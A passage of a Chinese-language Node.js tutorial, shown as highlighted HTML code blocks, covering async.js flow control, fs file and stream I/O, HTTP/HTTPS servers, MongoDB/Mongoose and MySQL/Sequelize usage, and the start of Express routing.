class="hljs-subst">$&#123;name&#125;</span>!`</span>);<br>&#125;);<br><br>emitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&#x27;greet&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="3-3-异步控制流管理"><a href="#3-3-异步控制流管理" class="headerlink" title="3.3 异步控制流管理"></a>3.3 异步控制流管理</h3><h4 id="3-3-1-async-js-库的使用"><a href="#3-3-1-async-js-库的使用" class="headerlink" title="3.3.1 async.js 库的使用"></a>3.3.1 <code>async.js</code> 库的使用</h4><p><code>async.js</code> 是一个控制异步流程的库，提供了多种控制异步任务的方式，如并行、串行等。</p><p><strong>并行执行异步任务：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">async</span>.<span class="hljs-title function_">parallel</span>([<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 1&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">1</span>);<br>    &#125;, <span class="hljs-number">1000</span>);<br>  &#125;,<br>  <span class="hljs-keyword">function</span>(<span class="hljs-params">callback</span>) &#123;<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Task 2&#x27;</span>);<br>      <span class="hljs-title function_">callback</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>);<br>    &#125;, <span class="hljs-number">500</span>);<br>  &#125;<br>], <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);  <span class="hljs-comment">// 输出: [1, 2]</span><br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="3-3-2-异步队列与并发控制"><a href="#3-3-2-异步队列与并发控制" class="headerlink" title="3.3.2 异步队列与并发控制"></a>3.3.2 异步队列与并发控制</h4><p><code>async.queue</code> 提供了一种控制并发执行任务的方式。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-keyword">async</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;async&#x27;</span>);<br><br><span class="hljs-keyword">const</span> q = <span class="hljs-keyword">async</span>.<span class="hljs-title function_">queue</span>(<span class="hljs-function">(<span class="hljs-params">task, callback</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Processing task <span class="hljs-subst">$&#123;task.name&#125;</span>`</span>);<br>  <span class="hljs-title function_">callback</span>();<br>&#125;, <span class="hljs-number">2</span>);  <span class="hljs-comment">// 最大并发数为 2</span><br><br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 1&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 2&#x27;</span>&#125;);<br>q.<span class="hljs-title function_">push</span>(&#123;<span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Task 3&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="4-文件操作与-I-O-1"><a href="#4-文件操作与-I-O-1" class="headerlink" title="4. 文件操作与 I&#x2F;O"></a>4. 文件操作与 I&#x2F;O</h2><h3 id="4-1-文件系统操作"><a href="#4-1-文件系统操作" class="headerlink" title="4.1 文件系统操作"></a>4.1 文件系统操作</h3><p>Node.js 的 <code>fs</code> 模块用于与文件系统交互，可以读取、写入文件以及管理目录。它支持同步和异步操作。</p><h4 id="4-1-1-读取与写入文件"><a href="#4-1-1-读取与写入文件" class="headerlink" title="4.1.1 读取与写入文件"></a>4.1.1 读取与写入文件</h4><p><strong>异步读取文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, data</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>同步读取文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> data = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;example.txt&#x27;</span>, <span class="hljs-string">&#x27;utf8&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data);<br></code></pre></td></tr></table></figure><p><strong>写入文件：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> content = <span class="hljs-string">&#x27;This is a new content.&#x27;</span>;<br>fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>, content, <span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;File written successfully.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-1-2-文件流与大文件处理"><a href="#4-1-2-文件流与大文件处理" class="headerlink" title="4.1.2 文件流与大文件处理"></a>4.1.2 文件流与大文件处理</h4><p>对于大文件，使用流处理更高效，因为流分块读取文件，而不是将整个文件读入内存。</p><p><strong>读取文件流：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> readStream = fs.<span class="hljs-title function_">createReadStream</span>(<span class="hljs-string">&#x27;largeFile.txt&#x27;</span>, &#123; <span class="hljs-attr">encoding</span>: <span class="hljs-string">&#x27;utf8&#x27;</span> &#125;);<br>readStream.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">chunk</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Received chunk: <span class="hljs-subst">$&#123;chunk&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>写入文件流：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> writeStream = fs.<span class="hljs-title function_">createWriteStream</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>);<br><br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;First chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">write</span>(<span class="hljs-string">&#x27;Second chunk of data\n&#x27;</span>);<br>writeStream.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;End of writing process.&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="4-2-网络-I-O-操作"><a href="#4-2-网络-I-O-操作" class="headerlink" title="4.2 网络 I&#x2F;O 操作"></a>4.2 网络 I&#x2F;O 操作</h3><p>Node.js 提供了丰富的网络操作模块，特别适合处理高并发的网络应用。</p><h4 id="4-2-1-创建-HTTP-服务器"><a href="#4-2-1-创建-HTTP-服务器" class="headerlink" title="4.2.1 创建 HTTP 服务器"></a>4.2.1 创建 HTTP 服务器</h4><p>Node.js 的 <code>http</code> 模块可以用于创建 HTTP 服务器，处理客户端请求和响应。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/plain&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, World!\n&#x27;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server is running at http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-2-2-处理请求与响应"><a href="#4-2-2-处理请求与响应" class="headerlink" title="4.2.2 处理请求与响应"></a>4.2.2 处理请求与响应</h4><p>在处理客户端请求时，Node.js 提供了 <code>req</code> 对象（表示请求）和 <code>res</code> 对象（表示响应）。</p><p><strong>获取请求的 URL 和方法：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> server = http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Requested URL: <span class="hljs-subst">$&#123;req.url&#125;</span>`</span>);<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Request method: <span class="hljs-subst">$&#123;req.method&#125;</span>`</span>);<br><br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>, &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;&lt;h1&gt;Hello, Node.js!&lt;/h1&gt;&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="4-2-3-使用-https-模块进行安全通信"><a href="#4-2-3-使用-https-模块进行安全通信" class="headerlink" title="4.2.3 使用 https 模块进行安全通信"></a>4.2.3 使用 <code>https</code> 模块进行安全通信</h4><p>使用 <code>https</code> 模块可以创建安全的 HTTPS 服务器。你需要提供 SSL 证书和私钥。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> https = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;https&#x27;</span>);<br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br><span class="hljs-keyword">const</span> options = &#123;<br>  <span class="hljs-attr">key</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;private-key.pem&#x27;</span>),<br>  <span class="hljs-attr">cert</span>: fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;certificate.pem&#x27;</span>)<br>&#125;;<br><br>https.<span class="hljs-title function_">createServer</span>(options, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>);<br>  res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&#x27;Hello, HTTPS world!&#x27;</span>);<br>&#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">443</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="5-数据库与存储-1"><a href="#5-数据库与存储-1" class="headerlink" title="5. 数据库与存储"></a>5. 数据库与存储</h2><p>Node.js 支持多种数据库，包括 NoSQL（如 MongoDB）和关系型数据库（如 MySQL）。</p><h3 id="5-1-使用-MongoDB"><a href="#5-1-使用-MongoDB" class="headerlink" title="5.1 使用 MongoDB"></a>5.1 使用 MongoDB</h3><p>MongoDB 是一种 NoSQL 数据库，适用于存储 JSON 风格的文档数据。使用 <code>mongoose</code> 库，可以轻松连接和操作 MongoDB 数据库。</p><h4 id="5-1-1-连接到-MongoDB"><a href="#5-1-1-连接到-MongoDB" class="headerlink" title="5.1.1 连接到 MongoDB"></a>5.1.1 连接到 MongoDB</h4><p>安装 <code>mongoose</code> 并连接到 MongoDB 数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mongoose<br></code></pre></td></tr></table></figure><p><strong>连接到 MongoDB：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mongoose = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mongoose&#x27;</span>);<br><br>mongoose.<span class="hljs-title function_">connect</span>(<span class="hljs-string">&#x27;mongodb://localhost:27017/mydb&#x27;</span>, &#123; <span class="hljs-attr">useNewUrlParser</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">useUnifiedTopology</span>: <span class="hljs-literal">true</span> &#125;);<br><br><span class="hljs-keyword">const</span> db = mongoose.<span class="hljs-property">connection</span>;<br>db.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">console</span>, <span class="hljs-string">&#x27;Connection error:&#x27;</span>));<br>db.<span class="hljs-title function_">once</span>(<span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MongoDB.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-1-2-CRUD-操作"><a href="#5-1-2-CRUD-操作" class="headerlink" title="5.1.2 CRUD 操作"></a>5.1.2 CRUD 操作</h4><p><strong>定义数据模型：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span><br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>创建新文档：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span> &#125;);<br>user.<span class="hljs-title function_">save</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User saved.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>查询数据：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">User</span>.<span class="hljs-title function_">find</span>(&#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Alice&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">err, users</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(users);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-1-3-使用-Mongoose-进行数据建模"><a href="#5-1-3-使用-Mongoose-进行数据建模" class="headerlink" title="5.1.3 使用 Mongoose 进行数据建模"></a>5.1.3 使用 Mongoose 进行数据建模</h4><p><code>Mongoose</code> 提供了 Schema 定义功能，帮助我们对 MongoDB 数据进行建模。</p><p><strong>定义 Schema：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> userSchema = <span class="hljs-keyword">new</span> mongoose.<span class="hljs-title class_">Schema</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,<br>  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span>,<br>  <span class="hljs-attr">email</span>: &#123; <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>, <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">unique</span>: <span class="hljs-literal">true</span> &#125;<br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = mongoose.<span class="hljs-title function_">model</span>(<span class="hljs-string">&#x27;User&#x27;</span>, userSchema);<br></code></pre></td></tr></table></figure><h3 id="5-2-使用-MySQL"><a href="#5-2-使用-MySQL" class="headerlink" title="5.2 使用 MySQL"></a>5.2 使用 MySQL</h3><p>MySQL 是一种关系型数据库，Node.js 提供了多种库来连接 MySQL 数据库，如 <code>mysql</code>、<code>sequelize</code> 等。</p><h4 id="5-2-1-连接到-MySQL"><a href="#5-2-1-连接到-MySQL" class="headerlink" title="5.2.1 连接到 MySQL"></a>5.2.1 连接到 MySQL</h4><p>安装 <code>mysql</code> 库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install mysql<br></code></pre></td></tr></table></figure><p><strong>连接到 MySQL：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> mysql = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;mysql&#x27;</span>);<br><br><span class="hljs-keyword">const</span> connection = mysql.<span class="hljs-title function_">createConnection</span>(&#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">user</span>: <span class="hljs-string">&#x27;root&#x27;</span>,<br>  <span class="hljs-attr">password</span>: <span class="hljs-string">&#x27;password&#x27;</span>,<br>  <span class="hljs-attr">database</span>: <span class="hljs-string">&#x27;mydb&#x27;</span><br>&#125;);<br><br>connection.<span class="hljs-title function_">connect</span>(<span class="hljs-function">(<span class="hljs-params">err</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Connected to MySQL.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-2-2-执行-SQL-查询"><a href="#5-2-2-执行-SQL-查询" class="headerlink" title="5.2.2 执行 SQL 查询"></a>5.2.2 执行 SQL 查询</h4><p><strong>执行 SELECT 查询：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;SELECT * FROM users&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">err, results</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(results);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>执行 INSERT 查询：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> user = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Bob&#x27;</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> &#125;;<br>connection.<span class="hljs-title function_">query</span>(<span class="hljs-string">&#x27;INSERT INTO users SET ?&#x27;</span>, user, <span class="hljs-function">(<span class="hljs-params">err, result</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;User added.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="5-2-3-使用-sequelize-进行-ORM-映射"><a href="#5-2-3-使用-sequelize-进行-ORM-映射" class="headerlink" title="5.2.3 使用 sequelize 进行 ORM 映射"></a>5.2.3 使用 <code>sequelize</code> 进行 ORM 映射</h4><p><code>sequelize</code> 是 Node.js 中常用的 ORM 工具，支持 MySQL、PostgreSQL、SQLite 等数据库。</p><p>安装 <code>sequelize</code> 和 MySQL 驱动：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install sequelize mysql2<br></code></pre></td></tr></table></figure><p><strong>定义模型并同步数据库：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> &#123; <span class="hljs-title class_">Sequelize</span>, <span class="hljs-title class_">DataTypes</span> &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sequelize&#x27;</span>);<br><span class="hljs-keyword">const</span> sequelize = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sequelize</span>(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>, &#123;<br>  <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>  <span class="hljs-attr">dialect</span>: <span class="hljs-string">&#x27;mysql&#x27;</span><br>&#125;);<br><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">User</span> = sequelize.<span class="hljs-title function_">define</span>(<span class="hljs-string">&#x27;User&#x27;</span>, &#123;<br>  <span class="hljs-attr">name</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">STRING</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;,<br>  <span class="hljs-attr">age</span>: &#123;<br>    <span class="hljs-attr">type</span>: <span class="hljs-title class_">DataTypes</span>.<span class="hljs-property">INTEGER</span>,<br>    <span class="hljs-attr">allowNull</span>: <span class="hljs-literal">false</span><br>  &#125;<br>&#125;);<br><br>sequelize.<span class="hljs-title function_">sync</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Database synced.&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><hr><h2 id="6-Web-开发与框架-1"><a href="#6-Web-开发与框架-1" class="headerlink" title="6. Web 开发与框架"></a>6. Web 开发与框架</h2><p>Node.js 是开发 Web 应用的热门选择，常用的 Web 框架包括 <strong>Express</strong> 和 <strong>Koa</strong>。</p><h3 id="6-1-使用-Express-框架"><a href="#6-1-使用-Express-框架" class="headerlink" title="6.1 使用 Express 框架"></a>6.1 使用 Express 框架</h3><p><code>Express</code> 是最流行的 Node.js Web 框架，简化了路由处理、请求处理和中间件管理。</p><h4 id="6-1-1-创建基本的-Express-应用"><a href="#6-1-1-创建基本的-Express-应用" class="headerlink" title="6.1.1 创建基本的 Express 应用"></a>6.1.1 创建基本的 Express 应用</h4><p>安装 <code>Express</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm install express<br></code></pre></td></tr></table></figure><p><strong>创建简单的 Express 应用：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Hello, Express!&#x27;</span>);<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Server running on http://localhost:3000&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h4 id="6-1-2-路由与中间件"><a href="#6-1-2-路由与中间件" class="headerlink" title="6.1.2 路由与中间件"></a>6.1.2 路由与中间件</h4><p><strong>定义路由：</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/user/:id&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-string">`User ID: <span 